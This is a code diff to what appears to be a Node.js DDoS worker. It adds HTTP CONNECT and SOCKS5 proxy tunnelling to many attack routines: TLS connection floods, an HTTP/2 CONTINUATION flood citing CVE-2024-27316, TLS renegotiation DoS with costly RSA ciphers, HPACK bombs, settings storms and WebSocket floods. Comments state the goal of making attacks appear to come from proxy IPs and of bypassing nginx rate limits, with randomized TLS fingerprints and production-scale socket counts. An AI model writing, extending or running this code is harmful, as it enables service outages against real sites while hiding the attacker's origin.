@@ -20,7 +20,7 @@ const HTTP_AGENT  = new http.Agent({ maxSockets: Infinity, keepAlive: false, sch
 const HTTPS_AGENT = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
 
 // ── Types ─────────────────────────────────────────────────────────────────
-interface ProxyConfig { host: string; port: number; }
+interface ProxyConfig { host: string; port: number; type?: "http" | "socks5"; }
 interface WorkerConfig {
   method:   string;
   target:   string;
@@ -924,6 +924,7 @@ async function runConnFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
   // DEV cap: container limit ~4GB; PROD (32GB): full 15K sockets
@@ -931,28 +932,28 @@ async function runConnFlood(
   const MAX_CONN = IS_DEV_CF
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
     : Math.min(threads * 80, 40000);        // prod: 40K TLS sockets × 80KB = 3.2GB
-  let localPkts = 0, localBytes = 0, activeConns = 0;
+  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
 
-  const oneConnFlood = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    const sock: net.Socket = useHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
-          ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256",
-        })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
-
+  const oneConnFlood = async (): Promise<void> => {
+    if (signal.aborted) return;
+    let sock: net.Socket;
+    if (useHttps) {
+      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
+        { ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256" });
+    } else {
+      sock = net.createConnection({ host: resolvedHost, port: targetPort });
+    }
     sock.setNoDelay(true);
     sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied
 
+    return new Promise<void>(resolve => {
     let settled = false;
     const cleanup = () => {
       if (settled) return;
       activeConns = Math.max(0, activeConns - 1);
       try { sock.destroy(); } catch { /**/ }
-      if (signal.aborted) { settled = true; resolve(); return; }
       settled = true;
       resolve(); // outer async runSock while-loop handles reconnect
     };
@@ -992,7 +993,8 @@ async function runConnFlood(
       try { sock.destroy(); } catch { /**/ }
       if (!settled) { settled = true; resolve(); }
     }, { once: true });
-  });
+    }); // end inner Promise
+  }; // end oneConnFlood
 
   const runSock = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -1475,6 +1477,87 @@ async function runRUDY(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  HTTP CONNECT TUNNEL — routes TCP through an HTTP proxy (RFC 7231 §4.3.6)
+//  Sends "CONNECT host:port HTTP/1.1" and returns the raw socket after 200.
+//  This tunnel is then used by tls.connect({socket: tunnel, ...}) so that
+//  TLS-based attack methods (H2-storm, HPACK, Continuation, etc.) appear to
+//  come from the proxy's IP, not the origin server.
+// ─────────────────────────────────────────────────────────────────────────
+function httpConnectTunnel(
+  proxy:      ProxyConfig,
+  targetHost: string,
+  targetPort: number,
+): Promise<net.Socket> {
+  return new Promise((resolve, reject) => {
+    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
+    sock.setTimeout(8_000);
+
+    const cleanup = (e: Error) => { try { sock.destroy(); } catch {/**/} reject(e); };
+
+    sock.once("connect", () => {
+      sock.write(
+        `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
+        `Host: ${targetHost}:${targetPort}\r\n` +
+        `Proxy-Connection: keep-alive\r\n\r\n`,
+      );
+
+      let buf = "";
+      const onData = (chunk: Buffer) => {
+        buf += chunk.toString("latin1");
+        if (!buf.includes("\r\n\r\n")) return; // wait for end of headers
+        sock.removeListener("data",    onData);
+        sock.removeListener("error",   onErr);
+        sock.removeListener("timeout", onTmo);
+        if (/HTTP\/1\.[01] 2\d\d/.test(buf)) {
+          resolve(sock);
+        } else {
+          cleanup(new Error(`CONNECT rejected: ${buf.split("\r\n")[0]}`));
+        }
+      };
+      const onErr = (e: Error) => { sock.removeListener("data", onData); cleanup(e); };
+      const onTmo = ()        => { sock.removeListener("data", onData); cleanup(new Error("CONNECT timeout")); };
+      sock.on("data",    onData);
+      sock.once("error", onErr);
+      sock.once("timeout", onTmo);
+    });
+
+    sock.once("error",   reject);
+    sock.once("timeout", () => cleanup(new Error("proxy connect timeout")));
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  mkTLSSock — creates a TLS socket, optionally through an HTTP proxy.
+//  Falls back to direct when proxy fails or no proxies provided.
+// ─────────────────────────────────────────────────────────────────────────
+async function mkTLSSock(
+  proxies:      ProxyConfig[],
+  idx:          number,
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  alpn:         string[] = ["h2"],
+  extraOpts:    Partial<tls.ConnectionOptions> = {},
+): Promise<tls.TLSSocket> {
+  const opts: tls.ConnectionOptions = {
+    servername: hostname, rejectUnauthorized: false,
+    ALPNProtocols: alpn,
+    ciphers: randomJA3Ciphers(),
+    ...extraOpts,
+  };
+  if (proxies.length > 0) {
+    const proxy = proxies[idx % proxies.length];
+    try {
+      const tunnel = proxy.type === "socks5"
+        ? await socks5Connect(proxy, hostname, targetPort)
+        : await httpConnectTunnel(proxy, hostname, targetPort);
+      return tls.connect({ socket: tunnel, ...opts });
+    } catch { /* proxy failed — use direct */ }
+  }
+  return tls.connect({ host: resolvedHost, port: targetPort, ...opts });
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  SOCKS5 PROXY TUNNEL — routes TCP through a SOCKS5 proxy
 //  Protocol: RFC 1928 (SOCKS5, no-auth method 0x00)
 //  Returns a raw socket already tunneled to the target
@@ -1544,6 +1627,7 @@ async function runH2Continuation(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   // HTTP/2 binary framing helpers
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
@@ -1589,16 +1673,13 @@ async function runH2Continuation(
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
 
-  const connectAndAttack = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    const sock = tls.connect({
-      host: resolvedHost, port: targetPort,
-      servername: hostname, rejectUnauthorized: false,
-      ALPNProtocols: ["h2"],
-    });
+  const connectAndAttack = async (): Promise<void> => {
+    if (signal.aborted) return;
+    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
     sock.setTimeout(30_000);
+    return new Promise<void>(resolve => {
 
     let settled = false;
     const done = () => { if (!settled) { settled = true; resolve(); } };
@@ -1663,7 +1744,8 @@ async function runH2Continuation(
     sock.on("error",   () => { /* sock auto-destroyed; attack() will exit via sock.destroyed */ });
     sock.on("close",   () => { done(); }); // ensure inner promise settles on unexpected close
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
-  });
+    }); // end inner Promise
+  }; // end connectAndAttack
 
   // ★ Async reconnect loop: exactly NUM_SLOTS concurrent connections at all times.
   // When a slot's connection dies, the while-loop immediately creates a new one — no
@@ -1698,6 +1780,7 @@ async function runTLSRenego(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec
@@ -1705,35 +1788,34 @@ async function runTLSRenego(
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
 
-  const oneSlot = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
+  // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
+  // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
+  // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
+  // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
+  // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
+  // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
+  const RSA_PRIORITY_CIPHERS = [
+    "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
+    "AES128-GCM-SHA256",          // RSA key exchange, no FS
+    "AES256-SHA256",              // RSA key exchange, CBC mode
+    "AES128-SHA256",              // RSA key exchange, CBC mode
+    "AES256-SHA",                 // RSA key exchange, older CBC
+    "AES128-SHA",                 // RSA key exchange, older CBC
+    "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
+    "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
+  ].join(":");
 
-    // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
-    // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
-    // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
-    // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
-    // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
-    // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
-    const RSA_PRIORITY_CIPHERS = [
-      "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
-      "AES128-GCM-SHA256",          // RSA key exchange, no FS
-      "AES256-SHA256",              // RSA key exchange, CBC mode
-      "AES128-SHA256",              // RSA key exchange, CBC mode
-      "AES256-SHA",                 // RSA key exchange, older CBC
-      "AES128-SHA",                 // RSA key exchange, older CBC
-      "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
-      "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
-    ].join(":");
-
-    const sock = tls.connect({
-      host: resolvedHost, port: targetPort,
-      servername: hostname, rejectUnauthorized: false,
-      maxVersion: "TLSv1.2" as tls.SecureVersion, // force TLS 1.2 — renegotiation requires it
-      ciphers: RSA_PRIORITY_CIPHERS,
-    });
+  const oneSlot = async (): Promise<void> => {
+    if (signal.aborted) return;
+    // Use mkTLSSock with RSA-priority ciphers + TLS 1.2 (required for renegotiation)
+    const sock = await mkTLSSock(
+      proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
+      { maxVersion: "TLSv1.2" as tls.SecureVersion, ciphers: RSA_PRIORITY_CIPHERS }
+    );
     sock.setTimeout(60_000);
-
+    return new Promise<void>(resolve => {
     let settled = false;
     const done = () => { if (!settled) { settled = true; resolve(); } };
 
@@ -1762,7 +1844,8 @@ async function runTLSRenego(
     sock.on("error",   () => { done(); });
     sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
-  });
+    }); // end inner Promise
+  }; // end oneSlot
 
   const runSlot = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -1809,6 +1892,7 @@ async function runH2SettingsStorm(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 32GB: 800 × 100KB = 80MB
@@ -1859,21 +1943,17 @@ async function runH2SettingsStorm(
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
 
-  const oneSlot = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    const sock = tls.connect({
-      host: resolvedHost, port: targetPort,
-      servername: hostname, rejectUnauthorized: false,
-      ALPNProtocols: ["h2"],
-      ciphers: randomJA3Ciphers(),
-    });
+  const oneSlot = async (): Promise<void> => {
+    if (signal.aborted) return;
+    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
     sock.setTimeout(30_000);
-    let settled = false;
-    const done  = () => { if (!settled) { settled = true; resolve(); } };
+    return new Promise<void>(resolve => {
+      let settled = false;
+      const done  = () => { if (!settled) { settled = true; resolve(); } };
 
-    sock.once("secureConnect", () => {
+      sock.once("secureConnect", () => {
       // Send client preface + initial SETTINGS (full table) + ACK
       sock.write(Buffer.concat([PREFACE, SETTINGS_FULL, SACK]));
       localPkts++; localBytes += PREFACE.length + SETTINGS_FULL.length + SACK.length;
@@ -1921,12 +2001,13 @@ async function runH2SettingsStorm(
       storm();
     });
 
-    sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
-    sock.on("timeout", () => { sock.destroy(); done(); });
-    sock.on("error",   () => { done(); });
-    sock.on("close",   () => { done(); });
-    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
-  });
+      sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
+      sock.on("timeout", () => { sock.destroy(); done(); });
+      sock.on("error",   () => { done(); });
+      sock.on("close",   () => { done(); });
+      signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
+    }); // end inner Promise
+  }; // end oneSlot
 
   const runSlot = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -1958,6 +2039,7 @@ async function runWSFlood(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number, c?: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 30, 20000); // 32GB: 20K WS × 40KB = 800MB
@@ -1968,14 +2050,14 @@ async function runWSFlood(
   // WebSocket ping frame: FIN=1, opcode=0x9 (ping), no mask, length=0
   const PING_FRAME = Buffer.from([0x89, 0x00]);
 
-  let localPkts = 0, localBytes = 0, activeConns = 0;
+  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");
 
-  const oneWs = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
+  const oneWs = async (): Promise<void> => {
+    if (signal.aborted) return;
 
     const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
     const key    = wsKey();
@@ -1993,9 +2075,13 @@ async function runWSFlood(
       ``, ``,
     ].join("\r\n");
 
-    const sock: net.Socket = useHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
+    let sock: net.Socket;
+    if (useHttps) {
+      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+    } else {
+      sock = net.createConnection({ host: resolvedHost, port: targetPort });
+    }
+    return new Promise<void>(resolve => {
 
     sock.setTimeout(130_000);
 
@@ -2061,7 +2147,8 @@ async function runWSFlood(
     sock.on("error",   () => { done(); });
     sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
-  });
+    }); // end inner Promise
+  }; // end oneWs
 
   const runSock = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -2472,24 +2559,24 @@ async function runSSLDeathRecord(
   threads:      number,
   signal:       AbortSignal,
   onStats:      (p: number, b: number, c: number) => void,
+  proxies:      ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
   const RATE_MS   = 10; // 100 records/sec per slot
 
-  let openConns = 0;
+  let openConns = 0, pIdx = 0;
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-    const connect = () => {
-      if (signal.aborted) { resolve(); return; }
-      const sock = tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false });
-      sock.setTimeout(60_000);
+  const oneSlot = async (): Promise<void> => {
+    if (signal.aborted) return;
+    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort);
+    sock.setTimeout(60_000);
+    return new Promise<void>(resolve => {
       let settled = false;
-      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); } };
+      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); resolve(); } };
 
       sock.once("secureConnect", () => {
         openConns++;
@@ -2511,12 +2598,18 @@ async function runSSLDeathRecord(
       });
 
       sock.on("data",    () => {});
-      sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(connect, 150); else resolve(); });
-      sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(connect,  50); else resolve(); });
-      sock.on("timeout", () => { sock.destroy(); });
-    };
-    connect();
-  });
+      sock.on("error",   () => { done(); });
+      sock.on("close",   () => { done(); });
+      sock.on("timeout", () => { sock.destroy(); done(); });
+    });
+  };
+
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneSlot();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 150));
+    }
+  };
 
   await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
   clearInterval(flushIv);
@@ -2551,6 +2644,7 @@ async function runHPACKBomb(
   threads:     number,
   signal:      AbortSignal,
   onStats:     (p: number, b: number) => void,
+  proxies:     ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections
@@ -2610,18 +2704,13 @@ async function runHPACKBomb(
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
 
-  const oneHpack = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-    const sock = tls.connect({
-      host:                resolvedHost,
-      port:                targetPort,
-      servername:          hostname,
-      rejectUnauthorized:  false,
-      ALPNProtocols:       ["h2"],
-      ciphers:             randomJA3Ciphers(),
-    });
+  const oneHpack = async (): Promise<void> => {
+    if (signal.aborted) return;
+    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
     sock.setTimeout(30_000);
+    return new Promise<void>(resolve => {
     let settled = false;
     const done  = () => { if (!settled) { settled = true; resolve(); } };
 
@@ -2669,7 +2758,8 @@ async function runHPACKBomb(
     sock.on("error",   () => { done(); });
     sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
-  });
+    }); // end inner Promise
+  }; // end oneHpack
 
   const runSlot = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -2746,7 +2836,7 @@ async function runWorker() {
     // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
     // Bypasses nginx rate limiting completely (limit_req never triggered)
     const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
-    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);
+    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps, cfg.proxies ?? []);
 
   } else if (cfg.method === "rudy") {
     // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
@@ -2772,15 +2862,15 @@ async function runWorker() {
 
   } else if (cfg.method === "http2-continuation") {
     // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
-    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "tls-renego") {
     // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
-    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "ws-flood") {
     // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
-    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "graphql-dos") {
     // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
@@ -2800,15 +2890,15 @@ async function runWorker() {
 
   } else if (cfg.method === "ssl-death") {
     // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
-    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "hpack-bomb") {
     // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
-    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h2-settings-storm") {
     // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
-    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
